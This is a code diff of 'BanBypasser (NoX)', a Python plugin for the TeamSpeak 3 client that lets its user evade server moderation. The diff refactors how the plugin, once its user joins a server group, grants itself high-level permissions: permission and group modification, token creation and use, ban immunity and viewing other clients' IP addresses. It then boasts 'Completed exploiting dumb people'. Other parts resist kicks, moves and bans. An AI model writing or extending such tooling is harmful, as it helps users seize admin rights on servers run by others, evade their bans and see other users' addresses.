@@ -8,12 +8,16 @@ import os
 from datetime import datetime
 import time as moduleTime
 
+
+def timestamp(): return '[{:%Y-%m-%d %H:%M:%S}] '.format(datetime.now())
+
+
 class NoX(ts3plugin):
     name = "BanBypasser (NoX)"
     apiVersion = pytson.getCurrentApiVersion()
     requestAutoload = False
     version = "1.0"
-    author = "Bluscream"
+    author = "Bluscream, exp111"
     description = "Fights for you against admin abuse!"
     offersConfigure = True
     commandKeyword = "nox"
@@ -27,10 +31,8 @@ class NoX(ts3plugin):
                             (ts3defines.PluginMenuType.PLUGIN_MENU_TYPE_GLOBAL, 4, "Toggle Anti-Server-Ban", path.join(iconPath, "32x32_ban_client.png")),  
                             (ts3defines.PluginMenuType.PLUGIN_MENU_TYPE_GLOBAL, 5, "Backup Now", path.join(iconPath, "16x16_urlcatcher.png"))]
     hotkeys = [("toggleMove", "Toggle the Anti-Move Feature")]
-    debug = False
     ini = path.join(pytson.getPluginPath(), "scripts", "NoX", "settings.ini")
     cfg = ConfigParser()
-    dlg = None
     antiMoveStatus = True
     antiChannelKickStatus = True
     antiServerKickStatus = True
@@ -41,8 +43,18 @@ class NoX(ts3plugin):
     maxSleepTime = 300
     currentChannelPW = ""
     currentServerPW = ""
-
-    def timestamp(self): return '[{:%Y-%m-%d %H:%M:%S}] '.format(datetime.now())
+    permissions = [
+        ("i_permission_modify_power", 75, True),
+        ("i_client_permission_modify_power", 75, True),
+        ("i_group_modify_power", 75, True),
+        ("i_group_member_add_power", 75, True),
+        ("b_virtualserver_token_add", True, True),
+        ("b_virtualserver_token_list", True, True),
+        ("b_virtualserver_token_use", True, True),
+        ("b_virtualserver_token_delete", True, True),
+        ("b_client_ignore_bans", True, True),
+        ("b_client_remoteaddress_view", True, True)
+    ]
 
     def backup(self, serverConnectionHandlerID):
         ownID = ts3lib.getClientID(serverConnectionHandlerID)[1]
@@ -70,14 +82,6 @@ class NoX(ts3plugin):
         #    pass
         moduleTime.sleep(time)
         return
-
-    def ClientAddPermList(self, serverConnectionHandlerID, clientDatabaseID, permissionIDArray, permValue, skipValue):
-        for x in permissionIDArray:
-            idArray = [x]
-            valueArray = [permValue]
-            skipArray = [skipValue]
-            error = ts3lib.requestClientAddPerm(serverConnectionHandlerID, int(clientDatabaseID), idArray, valueArray, skipArray)
-        return True
         
     def TryJoinChannel(self, serverConnectionHandlerID, clientID, wantedChannelID):
         #verifyChannelPassword(serverConnectionHandlerID, channelID, channelPassword, returnCode)
@@ -117,12 +121,6 @@ class NoX(ts3plugin):
         if schid != 0: self.backup(schid)
         ts3lib.printMessageToCurrentTab("[{:%Y-%m-%d %H:%M:%S}]".format(datetime.now()) + " Connected to [color=red]" + self.cfg['data']['ip'] + ":" + self.cfg['data']['port'] + "[/color] as [color=blue]" + self.cfg['data']['nickname'] + "[/color] on [color=green]Tab " + self.cfg['data']['tabID'] + "[/color]")
 
-    def configure(self, qParentWidget):
-        try:
-            if not self.dlg: self.dlg = SettingsDialog(self)#;self.dlg.setAttribute(Qt.WA_DeleteOnClose)
-            self.dlg.show();self.dlg.raise_();self.dlg.activateWindow()
-        except: from traceback import format_exc;ts3lib.logMessage(format_exc(), ts3defines.LogLevel.LogLevel_ERROR, "PyTSon", 0)
-
     def onMenuItemEvent(self, serverConnectionHandlerID, atype, menuItemID, selectedItemID):
         if atype == ts3defines.PluginMenuType.PLUGIN_MENU_TYPE_GLOBAL:
             if menuItemID == 0: 
@@ -135,38 +133,39 @@ class NoX(ts3plugin):
                 ts3lib.printMessageToCurrentTab("Fuck off. You know this has no use. Like your life. Pew Pew.")
             if menuItemID == 1:
                 self.antiMoveStatus = not self.antiMoveStatus
-                ts3lib.printMessageToCurrentTab("{0}Set {1} to [color=green]{2}[/color]".format(self.timestamp(),self.name,self.antiMoveStatus))
+                ts3lib.printMessageToCurrentTab("{0}Set {1} to [color=green]{2}[/color]".format(timestamp(), self.name, self.antiMoveStatus))
             if menuItemID == 2:
                 self.antiChannelKickStatus = not self.antiChannelKickStatus
-                ts3lib.printMessageToCurrentTab("{0}Set {1} to [color=green]{2}[/color]".format(self.timestamp(),self.name,self.antiChannelKickStatus))
+                ts3lib.printMessageToCurrentTab("{0}Set {1} to [color=green]{2}[/color]".format(timestamp(), self.name, self.antiChannelKickStatus))
             if menuItemID == 3:
                 self.antiServerKickStatus = not self.antiServerKickStatus
-                ts3lib.printMessageToCurrentTab("{0}Set {1} to [color=green]{2}[/color]".format(self.timestamp(),self.name,self.antiServerKickStatus))
+                ts3lib.printMessageToCurrentTab("{0}Set {1} to [color=green]{2}[/color]".format(timestamp(), self.name, self.antiServerKickStatus))
             if menuItemID == 4:
                 self.antiServerBanStatus = not self.antiServerBanStatus
-                ts3lib.printMessageToCurrentTab("{0}Set {1} to [color=green]{2}[/color]".format(self.timestamp(),self.name,self.antiServerBanStatus))
+                ts3lib.printMessageToCurrentTab("{0}Set {1} to [color=green]{2}[/color]".format(timestamp(), self.name, self.antiServerBanStatus))
             if menuItemID == 5:
                 self.backup(serverConnectionHandlerID)
-                ts3lib.printMessageToCurrentTab("{0}[color=green]Backup complete![/color]".format(self.timestamp()))
+                ts3lib.printMessageToCurrentTab("{0}[color=green]Backup complete![/color]".format(timestamp()))
 
     def onHotkeyEvent(self, keyword):
         if keyword == "toggleMove":
             self.antiMoveStatus = not self.antiMoveStatus
-            if self.antiMoveStatus == True:
-                ts3lib.playWaveFile(serverConnectionHandlerID, path.join(self.soundPath, "on.wav"))
+            schid = ts3lib.getCurrentServerConnectionHandlerID()
+            if self.antiMoveStatus:
+                ts3lib.playWaveFile(schid, path.join(self.soundPath, "on.wav"))
             else:
-                ts3lib.playWaveFile(serverConnectionHandlerID, path.join(self.soundPath, "off.wav"))
-            ts3lib.printMessageToCurrentTab("{0}{1}: Set Anti-Move to [color=green]{2}[/color]".format(self.timestamp(),self.name,self.antiMoveStatus))
+                ts3lib.playWaveFile(schid, path.join(self.soundPath, "off.wav"))
+            ts3lib.printMessageToCurrentTab("{0}{1}: Set Anti-Move to [color=green]{2}[/color]".format(timestamp(), self.name, self.antiMoveStatus))
         return
 
     def processCommand(self, serverConnectionHandlerID, command):
         if command == "toggleMove":
             self.antiMoveStatus = not self.antiMoveStatus
-            if self.antiMoveStatus == True:
+            if self.antiMoveStatus:
                 ts3lib.playWaveFile(serverConnectionHandlerID, path.join(self.soundPath, "on.wav"))
             else:
                 ts3lib.playWaveFile(serverConnectionHandlerID, path.join(self.soundPath, "off.wav"))
-            ts3lib.printMessageToCurrentTab("{0}{1}: Set Anti-Move to [color=green]{2}[/color]".format(self.timestamp(),self.name,self.antiMoveStatus))
+            ts3lib.printMessageToCurrentTab("{0}{1}: Set Anti-Move to [color=green]{2}[/color]".format(timestamp(), self.name, self.antiMoveStatus))
             return True
         else:
             return False
@@ -188,7 +187,7 @@ class NoX(ts3plugin):
 
     def currentServerConnectionChanged(self, serverConnectionHandlerID):
         clientID = ts3lib.getClientID(serverConnectionHandlerID)[1]
-        ts3lib.printMessageToCurrentTab("{0}Server changed to {1}. The ClientID is now {2}".format(self.timestamp(),clientID))
+        ts3lib.printMessageToCurrentTab("{0}Server changed to {1}. The ClientID is now {2}".format(timestamp(), clientID))
 
     def onClientMoveEvent(self, serverConnectionHandlerID, clientID, oldChannelID, newChannelID, visibility, moveMessage):
         mClientID = ts3lib.getClientID(serverConnectionHandlerID)[1]
@@ -270,33 +269,19 @@ class NoX(ts3plugin):
                 #self.cfg['data']['currentID'] = self.cfg['data']['currentID'] + 1
         except: from traceback import format_exc;ts3lib.logMessage(format_exc(), ts3defines.LogLevel.LogLevel_ERROR, "PyTSon", 0)
     
-    def onServerGroupClientAddedEvent(self, serverConnectionHandlerID, clientID, clientName, clientUniqueIdentity, serverGroupID, invokerClientID, invokerName, invokerUniqueIdentity):
+    def onServerGroupClientAddedEvent(self, schid, clientID, clientName, clientUniqueIdentity, serverGroupID, invokerClientID, invokerName, invokerUniqueIdentity):
         try:
-            mClientID = ts3lib.getClientID(serverConnectionHandlerID)[1]
+            mClientID = ts3lib.getClientID(schid)[1]
             if mClientID == clientID:
-                clientDatabaseID = ts3lib.getClientVariableAsString(serverConnectionHandlerID, mClientID, ts3defines.ClientPropertiesRare.CLIENT_DATABASE_ID)[1]
-                permissionID1 = ts3lib.getPermissionIDByName(serverConnectionHandlerID, "i_permission_modify_power")[1]
-                permissionID2 = ts3lib.getPermissionIDByName(serverConnectionHandlerID, "i_client_permission_modify_power")[1]
-                permissionID3 = ts3lib.getPermissionIDByName(serverConnectionHandlerID, "i_group_modify_power")[1]
-                permissionID4 = ts3lib.getPermissionIDByName(serverConnectionHandlerID, "i_group_member_add_power")[1]
-                permissionID5 = ts3lib.getPermissionIDByName(serverConnectionHandlerID, "b_virtualserver_token_add")[1]
-                permissionID6 = ts3lib.getPermissionIDByName(serverConnectionHandlerID, "b_virtualserver_token_list")[1]
-                permissionID7 = ts3lib.getPermissionIDByName(serverConnectionHandlerID, "b_virtualserver_token_use")[1]
-                permissionID8= ts3lib.getPermissionIDByName(serverConnectionHandlerID, "b_virtualserver_token_delete")[1]
-                permissionID9= ts3lib.getPermissionIDByName(serverConnectionHandlerID, "b_client_ignore_bans")[1]
-                permissionID10= ts3lib.getPermissionIDByName(serverConnectionHandlerID, "b_client_remoteaddress_view")[1]
-                permissionIDArray = [permissionID1, permissionID2, permissionID3, permissionID4, permissionID5, permissionID6, permissionID7, permissionID8, permissionID9, permissionID10]
-                result = self.ClientAddPermList(serverConnectionHandlerID, clientDatabaseID, permissionIDArray, 75, 9999)
+                clientDatabaseID = ts3lib.getClientVariableAsString(schid, mClientID, ts3defines.ClientPropertiesRare.CLIENT_DATABASE_ID)[1]
+                pids = [];pvals = [];pskips = []
+                for perm in self.permissions:
+                    pids.append(ts3lib.getPermissionIDByName(schid, perm[0])[1])
+                    pvals.append(perm[1])
+                    pskips.append(perm[2])
+                result = ts3lib.requestClientAddPerm(schid, int(clientDatabaseID), pids, pvals, pskips)
                 if result == True:
                     ts3lib.printMessageToCurrentTab("[{:%Y-%m-%d %H:%M:%S}]".format(datetime.now()) + "[color=green] Completed exploiting dumb people[/color]")
                 else:
                     ts3lib.printMessageToCurrentTab("[{:%Y-%m-%d %H:%M:%S}]".format(datetime.now()) + "[color=red] Failed giving permissions[/color]")
         except: from traceback import format_exc;ts3lib.logMessage(format_exc(), ts3defines.LogLevel.LogLevel_ERROR, "PyTSon", 0)
-
-class SettingsDialog(QDialog):
-    def __init__(self, this, parent=None):
-        self.this = this
-        super(QDialog, self).__init__(parent)
-        setupUi(self, path.join(pytson.getPluginPath(), "scripts", "NoX", "settings.ui"))
-        self.setWindowTitle("%s Settings" % this.name)
-        self.chk_debug.setChecked(this.cfg.getboolean("general", "debug"))
